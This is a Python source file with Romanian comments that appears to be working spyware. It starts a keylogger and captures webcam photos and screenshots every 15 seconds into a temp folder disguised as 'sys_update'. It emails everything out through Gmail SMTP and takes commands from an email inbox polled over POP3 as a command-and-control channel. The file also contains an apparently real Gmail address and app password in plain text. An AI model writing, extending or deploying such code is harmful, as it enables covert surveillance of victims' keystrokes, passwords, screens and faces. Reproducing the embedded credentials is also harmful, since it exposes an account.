import smtplib
import poplib
import email
import threading
import time
import pynput.keyboard
from pynput import keyboard
from PIL import ImageGrab
import cv2
import os
import sys
import tempfile
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

# ====================== CONFIGURARE SMTP ======================
SMTP_CONFIG = {
    'server': 'smtp.gmail.com',
    'port': 587,
    'email': 'romanbogdan475@gmail.com',
    'password': 'cxzv ddop qosk hvdy'
}


class Agent:
    def __init__(self):
        self.recipient_email = None
        self.keylogger_running = False
        self.camera_running = True
        self.screenshot_running = True
       
        self.key_listener = None
        self.buffer = ""
       
        self.base_folder = os.path.join(tempfile.gettempdir(), "sys_update")
        self.photo_folder = os.path.join(self.base_folder, "photos")
        self.screenshot_folder = os.path.join(self.base_folder, "screenshots")
       
        os.makedirs(self.photo_folder, exist_ok=True)
        os.makedirs(self.screenshot_folder, exist_ok=True)
        
        # Intervale (modificabile din C2)
        self.key_interval = 15
        self.camera_interval = 15
        self.capture_interval = 15
       
        print("[+] Agent pornit - Așteaptă SET_RECIPIENT din C2")
        print(f"[+] Intervale inițiale → Key: {self.key_interval}s | Camera: {self.camera_interval}s | Screenshot: {self.capture_interval}s")

        self.start_keylogger()
        self.start_keylog_sender()
        self.start_auto_camera()
        self.start_auto_screenshot()
        self.start_command_checker()

    # ====================== TRIMITERE EMAIL ======================
    def send_email(self, subject, body, attachments=None):
        if not self.recipient_email:
            print("[-] Adresa de recepție nu este setată!")
            return False
        try:
            msg = MIMEMultipart()
            msg['From'] = SMTP_CONFIG['email']
            msg['To'] = self.recipient_email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            if attachments:
                for file_path in attachments:
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as f:
                            if file_path.lower().endswith(('.jpg', '.jpeg', '.png')):
                                img = MIMEImage(f.read(), name=os.path.basename(file_path))
                                msg.attach(img)

            with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
                server.starttls()
                server.login(SMTP_CONFIG['email'], SMTP_CONFIG['password'])
                server.send_message(msg)
           
            print(f"[+] Trimis: {subject}")
            return True
        except Exception as e:
            print(f"[-] Eroare email: {e}")
            return False

    # ====================== KEYLOGGER ======================
    def start_keylogger(self):
        if self.keylogger_running: return
        self.keylogger_running = True
       
        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                if key == keyboard.Key.space:
                    char = " "
                elif key == keyboard.Key.enter:
                    char = "\n"
                elif key == keyboard.Key.backspace:
                    char = "[BACK]"
                else:
                    char = f"[{str(key).replace('Key.', '')}]"
           
            self.buffer += char
          
        self.key_listener = keyboard.Listener(on_press=on_press)
        self.key_listener.start()
        print("[+] Keylogger pornit")

    def start_keylog_sender(self):
        def loop():
            while True:
                time.sleep(self.key_interval)          # MODIFICAT
                if self.buffer.strip():
                    self.send_email("KEYLOG", f"Keylogger Report:\n\n{self.buffer}")
                    print(f"[+] Keylogger trimis ({len(self.buffer)} caractere)")
                    self.buffer = ""
                else:
                    print("[DEBUG] Buffer gol")
        threading.Thread(target=loop, daemon=True).start()
        print(f"[+] Trimitere keylog individual pornită ({self.key_interval} secunde)")

    # ====================== CAMERA ======================
    def start_auto_camera(self):
        def loop():
            while self.camera_running:
                try:
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    ret, frame = cap.read()
                    if ret:
                        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                        path = os.path.join(self.photo_folder, f"photo_{ts}.jpg")
                        cv2.imwrite(path, frame)
                        self.send_email("PHOTO", "Poză automată", [path])
                except:
                    pass
                finally:
                    if 'cap' in locals():
                        cap.release()
                time.sleep(self.camera_interval)       # MODIFICAT
        threading.Thread(target=loop, daemon=True).start()
        print(f"[+] Auto Camera pornită ({self.camera_interval} secunde)")

    # ====================== SCREENSHOT ======================
    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.screenshot_folder, f"screenshot_{ts}.png")
            screenshot.save(path)
            self.send_email("SCREENSHOT", "Screenshot automată", [path])
        except Exception as e:
            print(f"[-] Eroare screenshot: {e}")

    def start_auto_screenshot(self):
        def loop():
            while self.screenshot_running:
                self.take_screenshot()
                time.sleep(self.capture_interval)      # MODIFICAT
        threading.Thread(target=loop, daemon=True).start()
        print(f"[+] Auto Screenshot pornit ({self.capture_interval} secunde)")

    # ====================== COMENZI ======================
    def start_command_checker(self):
        def loop():
            while True:
                try:
                    pop_conn = poplib.POP3_SSL('pop.gmail.com', 995)
                    pop_conn.user(SMTP_CONFIG['email'])
                    pop_conn.pass_(SMTP_CONFIG['password'])
                   
                    num_messages = len(pop_conn.list()[1])
                    for i in range(max(1, num_messages - 20), num_messages + 1):
                        raw_email = b"\n".join(pop_conn.retr(i)[1])
                        msg = email.message_from_bytes(raw_email)
                        subject = msg.get('Subject', '').strip()
                        if subject.startswith('COMMAND:'):
                            command = subject[9:].strip()
                            print(f"[*] Comandă primită: {command}")
                            if command.startswith("SET_RECIPIENT:"):
                                new_email = command[13:].strip()
                                if "@" in new_email:
                                    self.recipient_email = new_email
                                    print(f"[+] Recepție setată la: {new_email}")
                                    self.send_email("INFO", f"Adresă actualizată: {new_email}")
                   
                    pop_conn.quit()
                except:
                    pass
                time.sleep(10)   # checker interval (poate fi modificat ulterior)
        threading.Thread(target=loop, daemon=True).start()

if __name__ == "__main__":
    agent = Agent()
    print("Agentul rulează. Trimite comanda SET_RECIPIENT: din C2 Server.")
   
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Agent oprit.")
        sys.exit(0)